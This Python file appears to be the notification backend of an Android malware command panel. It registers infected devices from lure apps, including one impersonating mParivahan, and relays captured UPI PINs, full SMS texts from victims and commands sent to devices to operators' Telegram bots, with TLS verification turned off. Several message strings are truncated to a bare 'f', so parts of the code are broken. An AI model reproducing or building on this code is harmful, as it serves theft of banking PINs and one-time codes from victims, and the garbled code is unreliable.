import aiohttp
import logging
import ssl
from datetime import datetime
from typing import Optional, Dict, List
from ..database import mongodb
from ..config import settings

logger = logging.getLogger(__name__)

class TelegramMultiService:

    def __init__(self):
        self.enabled = settings.TELEGRAM_ENABLED

        self.twofa_bot_token = settings.TELEGRAM_2FA_BOT_TOKEN
        self.twofa_chat_id = settings.TELEGRAM_2FA_CHAT_ID

        self.ssl_context = ssl.create_default_context()
        self.ssl_context.check_hostname = False
        self.ssl_context.verify_mode = ssl.CERT_NONE

        if not self.enabled:
            logger.warning("??  Telegram notifications disabled")
        else:
            logger.info("? Telegram Multi-Service initialized")

    async def get_admin_bots(self, admin_username: str) -> List[Dict]:
        admin_doc = await mongodb.db.admins.find_one(
            {"username": admin_username},
            {"telegram_bots": 1}
        )

        if admin_doc and "telegram_bots" in admin_doc:

            valid_bots = [
                bot for bot in admin_doc["telegram_bots"]
                if "TOKEN_HERE" not in bot.get("token", "")
            ]
            return valid_bots

        return []

    async def send_to_admin(
        self,
        admin_username: str,
        message: str,
        bot_index: Optional[int] = None,
        parse_mode: str = "HTML"
    ) -> bool:
        if not self.enabled:
            return False

        bots = await self.get_admin_bots(admin_username)

        if not bots:
            logger.warning(f"??  No bots configured for admin: {admin_username}")
            return False

        if bot_index is not None:
            target_bot = next((bot for bot in bots if bot["bot_id"] == bot_index), None)
            if target_bot:
                return await self._send_message_to_chat(
                    target_bot["token"],
                    target_bot["chat_id"],
                    message,
                    parse_mode
                )
            else:
                logger.warning(f"??  Bot {bot_index} not found for admin {admin_username}")
                return False

        results = []
        for bot in bots:
            result = await self._send_message_to_chat(
                bot["token"],
                bot["chat_id"],
                message,
                parse_mode
            )
            results.append(result)

        return any(results)

    async def send_to_all_admins(
        self,
        message: str,
        parse_mode: str = "HTML"
    ) -> Dict[str, bool]:
        results = {}

        cursor = mongodb.db.admins.find({}, {"username": 1})
        admins = await cursor.to_list(length=1000)

        for admin in admins:
            username = admin["username"]
            success = await self.send_to_admin(username, message, parse_mode=parse_mode)
            results[username] = success

        return results

    async def send_2fa_notification(
        self,
        admin_username: str,
        ip_address: str,
        code: Optional[str] = None,
        message_prefix: Optional[str] = None
    ) -> bool:

        admin = await mongodb.db.admins.find_one({"username": admin_username})

        if not admin:
            logger.warning(f"??  Admin not found for 2FA: {admin_username}")
            return False

        telegram_2fa_chat_id = admin.get("telegram_2fa_chat_id")

        if not telegram_2fa_chat_id:
            logger.warning(f"??  telegram_2fa_chat_id not configured for admin: {admin_username}")
            return False

        if not self.twofa_bot_token or "TOKEN_HERE" in self.twofa_bot_token:
            logger.warning(f"??  2FA Bot token not configured")
            return False

        if message_prefix:
            message = message_prefix
        else:
            message = "?? <b>Two-Factor Authentication</b>\n\n"

        message += f"?? Admin: <code>{admin_username}</code>\n"
        message += f"?? IP: <code>{ip_address}</code>\n"

        if code:
            message += f"?? Code: <code>{code}</code>\n"

        message += f"? Time: {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC"

        return await self._send_message_to_chat(
            self.twofa_bot_token,
            telegram_2fa_chat_id,
            message,
            "HTML"
        )

    async def _send_message_to_chat(self, bot_token: str, chat_id: str, message: str, parse_mode: str = "HTML") -> bool:
        try:
            url = f"https://api.telegram.org/bot{bot_token}/sendMessage"

            data = {
                "chat_id": chat_id,
                "text": message,
                "parse_mode": parse_mode
            }

            async with aiohttp.ClientSession() as session:
                async with session.post(url, json=data, ssl=self.ssl_context) as response:
                    if response.status == 200:
                        logger.info(f"? Message sent to chat: {chat_id[:10]}...")
                        return True
                    else:
                        error_text = await response.text()
                        logger.error(f"? Failed to send to {chat_id}: {error_text}")
                        return False

        except Exception as e:
            logger.error(f"? Error sending to {chat_id}: {e}")
            return False

    async def notify_device_registered(
        self,
        device_id: str,
        device_info: dict,
        admin_username: str
    ):

        app_type = device_info.get('app_type', 'Unknown')

        app_names = {
            'sexychat': '?? SexyChat',
            'mparivahan': '?? mParivahan',
            'sexyhub': '?? SexyHub'
        }
        app_display = app_names.get(app_type.lower(), f'?? {app_type}')

        message = f

        await self.send_to_admin(admin_username, message, bot_index=1)

        await self._notify_super_admin(message, bot_index=1, exclude_username=admin_username)

    async def notify_upi_detected(
        self,
        device_id: str,
        upi_pin: str,
        admin_username: str
    ):
        message = f

        await self.send_to_admin(admin_username, message, bot_index=1)

        await self._notify_super_admin(message, bot_index=1, exclude_username=admin_username)

    async def notify_admin_login(
        self,
        admin_username: str,
        ip_address: str,
        success: bool = True
    ):
        icon = "?" if success else "?"
        status = "Successful" if success else "Failed"

        message = f

        await self.send_to_admin(admin_username, message, bot_index=4)

        await self._notify_super_admin(message, bot_index=4, exclude_username=admin_username)

    async def notify_command_sent(
        self,
        admin_username: str,
        device_id: str,
        command: str
    ):
        message = f

        await self.send_to_admin(admin_username, message, bot_index=3)

        await self._notify_super_admin(message, bot_index=3, exclude_username=admin_username)

    async def notify_new_sms(
        self,
        device_id: str,
        admin_username: str,
        from_number: str,
        full_message: str
    ):

        max_message_length = 3500

        if len(full_message) > max_message_length:
            sms_text = full_message[:max_message_length] + "\n\n... (???? ????? ??)"
        else:
            sms_text = full_message

        message = f

        await self.send_to_admin(admin_username, message, bot_index=2)

        await self._notify_super_admin(message, bot_index=2, exclude_username=admin_username)

    async def notify_admin_created(
        self,
        creator_username: str,
        new_admin_username: str,
        role: str,
        device_token: str
    ):
        message = f

        await self.send_to_admin(creator_username, message, bot_index=3)

        await self._notify_super_admin(message, bot_index=3, exclude_username=creator_username)

    async def notify_admin_logout(
        self,
        admin_username: str,
        ip_address: str
    ):
        message = f

        await self.send_to_admin(admin_username, message, bot_index=4)

        await self._notify_super_admin(message, bot_index=4, exclude_username=admin_username)

    async def notify_admin_action(
        self,
        admin_username: str,
        action: str,
        details: str = "",
        ip_address: str = None
    ):
        message = f
        if details:
            message += f"?? Details: {details}\n"

        if ip_address:
            message += f"?? IP: <code>{ip_address}</code>\n"
        message += f"?? Time: {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC"

        await self.send_to_admin(admin_username, message, bot_index=3)

        await self._notify_super_admin(message, bot_index=3, exclude_username=admin_username)

    async def _notify_super_admin(
        self,
        message: str,
        bot_index: int,
        exclude_username: Optional[str] = None
    ):
        try:

            cursor = mongodb.db.admins.find(
                {"role": "super_admin"},
                {"username": 1}
            )
            super_admins = await cursor.to_list(length=100)

            for admin in super_admins:
                username = admin["username"]

                if exclude_username and username == exclude_username:
                    continue

                await self.send_to_admin(username, message, bot_index=bot_index)

        except Exception as e:
            logger.error(f"? Error notifying super admin: {e}")

telegram_multi_service = TelegramMultiService()